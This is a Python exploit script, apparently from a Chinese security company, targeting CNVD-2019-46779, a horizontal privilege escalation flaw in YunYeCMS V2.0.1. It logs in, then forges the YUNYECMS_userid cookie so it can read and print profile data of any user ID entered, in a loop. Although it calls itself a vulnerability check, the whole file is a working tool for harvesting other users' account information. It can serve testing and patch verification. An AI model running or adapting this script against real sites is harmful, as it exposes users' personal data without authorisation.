#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CNVD-2019-46779
# Written by: 秋水
# Company: 泽鹿安全
#
# from pyfiglet import Figlet
from bs4 import BeautifulSoup
import time
import requests
import datetime
import optparse

code = 'CNVD-2019-46779'
version = '1.0'
author = '秋水'
vulDate = '2020-04-09'
createDate = '2020-04-09'
updateDate = '2020-04-09'
name = 'YunYeCMs存在水平越权漏洞(CNVD-2019-46779)'
appPowerLink = 'http://www.yunyecms.com/'
appName = 'YunYeCMS'
appVersion = '''YunYeCMS V2.0.1'''
way = '''python CNVD-2019-46779.py -u http://127.0.0.1  -n test -p 123456'''


# 打印当前时间
def nowtime():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return now


# 程序结束
def endtime():
    print(" ")
    time.sleep(0.3)
    print("*] shutting down at %s" % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


# 输出基本信息
def output():
    # f = Figlet(font='slant')  # 斜体 不slant是默认的字体 是不倾斜的
    # code1 = f.renderText(code)
    # print(" ")
    # print(code1)  # 里面写需要的生成的文字，只支持英文
    print(" ")
    time.sleep(0.3)
    print("[*] 漏洞名称：%s" % name)
    time.sleep(0.3)
    print("[*] 影响版本：%s" % appVersion)
    time.sleep(0.3)
    print("[*] 使用方式：%s" % way)
    time.sleep(0.3)
    print("[*] 脚本版本：%s" % version)
    time.sleep(0.3)
    print("[*] 更新日期：%s" % updateDate)
    time.sleep(0.3)
    print("  ")
    print('''***********************************
           开始检测漏洞
***********************************''')
    print("  ")


def check():
    try:
        address = url + "/index.php?m=member&c=member&a=login"
        rsp = session.get(address)
        text = rsp.text
        soup = BeautifulSoup(text, "html.parser")
        username = options.username
        pwd = options.password
        token = soup.find("input", {'name': 'token'}).get("value")
        data = {
            "username": "%s" % username,
            "pwd": "%s" % pwd,
            "token": "%s" % token
        }
        address1 = url + "/index.php?m=member&c=member&a=logincheck"
        time.sleep(0.3)
        print("[*] %s 正在登录..." % nowtime())
        rsp1 = session.post(address1, data=data)
        if rsp1.status_code == 200 and "登录成功" in str(rsp1.text):
            time.sleep(0.3)
            print("[+] 登录成功！")
            address2 = url + "/index.php?m=member&c=member&a=index"
            # print(session.cookies)
            while True:
                time.sleep(0.3)
                user_id = input("请输入想要查询的userId：")
                session.cookies.set("YUNYECMS_userid", "%s" % user_id)
                rsp2 = session.get(address2)
                text2 = rsp2.text
                if rsp2.status_code == 200 and "MySQL Error" in str(text2):
                    time.sleep(0.3)
                    choose = input("[-] 所查找的用户id不存在！是否重新输入y/n：")
                    if choose == "y":
                        continue
                    else:
                        endtime()
                        break
                else:
                    soup1 = BeautifulSoup(text2, "html.parser")
                    div = soup1.find(attrs={"class": "meminfo"})
                    spans = div.findAll("span")
                    print(spans[0].text)
                    print(spans[3].text)
                    print(spans[4].text)
                    print(spans[5].text)
                    time.sleep(0.3)
                    choose = input("[-] 是否继续查找，请选择y/n：")
                    if choose == "y":
                        continue
                    else:
                        endtime()
                        break
        else:
            time.sleep(0.3)
            print("[-] 登录失败！")
            endtime()

    except requests.exceptions.ConnectionError:
        print("[-] 目标网站无法访问")
        endtime()
    except requests.exceptions.MissingSchema:
        print("[-] 目标网站格式不合法")
        endtime()


if __name__ == "__main__":
    # noinspection PyBroadException
    try:
        usage = "python %prog -u/-U <target url> -n/-N <username> -p/-P <password>"  # 用于显示帮助信息
        parser = optparse.OptionParser(usage)  # 创建对象实例
        parser.add_option('-u', '-U', dest='url', action='store', help='target url',
                          default=False)  # 需要的命令行参数
        parser.add_option("-n", '-N', dest='username', action='store', help='userName', default=False)
        parser.add_option("-p", '-P', dest='password', action='store', help='password', default=False)
        (options, args) = parser.parse_args()
        session = requests.session()
        if options.url:
            url = options.url
            output()
            check()
        else:
            parser.print_help()
            endtime()

    except BaseException as e:
        print("[-] 请输入参数值！")
        endtime()
